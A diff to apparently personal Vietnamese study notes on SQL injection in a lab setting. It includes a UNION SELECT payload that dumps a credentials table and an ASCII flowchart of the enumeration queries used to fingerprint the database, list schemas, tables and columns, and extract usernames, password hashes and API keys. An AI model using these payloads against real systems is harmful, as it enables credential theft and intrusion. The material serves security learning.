@@ -53,3 +53,60 @@ Chi tiết
   Sau khi biết cột, có thể dump dữ liệu trực tiếp: ' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
   Kết quả: lấy được username, password hash, thậm chí API key.
 
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Flow cho dễ nhìn 
+
+   +----------------------------------------------------+
+   | 1. Fingerprint DBMS                                |
+   | -------------------------------------------------- |
+   | Query: @@version / POW(1,1) / SLEEP(5)             |
+   | Thu được: DBMS type (MySQL/MariaDB + version)      |
+   | Dùng để: Biết chắc DB là MySQL => dùng đúng cú pháp|
+   +----------------------------------------------------+
+                           |
+                           v
+   +----------------------------------------------------+
+   | 2. Liệt kê databases                                |
+   | -------------------------------------------------- |
+   | Query: SELECT schema_name FROM information_schema.schemata |
+   | Thu được: Danh sách DB (mysql, information_schema, ... , dev, ilfreight) |
+   | Dùng để: Xác định DB nào là của ứng dụng            |
+   +----------------------------------------------------+
+                           |
+                           v
+   +----------------------------------------------------+
+   | 3. DB hiện tại (app đang dùng)                     |
+   | -------------------------------------------------- |
+   | Query: SELECT database()                           |
+   | Thu được: Tên DB đang dùng, vd: ilfreight          |
+   | Dùng để: Biết context hiện tại, và chọn đúng DB để  |
+   |           dump bảng (hoặc chuyển sang DB khác)     |
+   +----------------------------------------------------+
+                           |
+                           v
+   +----------------------------------------------------+
+   | 4. Liệt kê bảng trong DB quan tâm                  |
+   | -------------------------------------------------- |
+   | Query: SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dev' |
+   | Thu được: Tên bảng, vd: credentials, framework, pages, posts |
+   | Dùng để: Xác định bảng nào chứa dữ liệu nhạy cảm    |
+   +----------------------------------------------------+
+                           |
+                           v
+   +----------------------------------------------------+
+   | 5. Liệt kê cột trong bảng                          |
+   | -------------------------------------------------- |
+   | Query: SELECT column_name FROM information_schema.columns WHERE table_name='credentials' AND table_schema='dev' |
+   | Thu được: Tên cột, vd: username, password          |
+   | Dùng để: Biết chính xác trường nào cần dump        |
+   +----------------------------------------------------+
+                           |
+                           v
+   +----------------------------------------------------+
+   | 6. Dump dữ liệu thực                               |
+   | -------------------------------------------------- |
+   | Query: SELECT username, password FROM dev.credentials |
+   | Thu được: Dữ liệu thật (tài khoản, hash, API key…) |
+   | Dùng để: Đăng nhập, leo thang, exploit tiếp         |
+   +----------------------------------------------------+
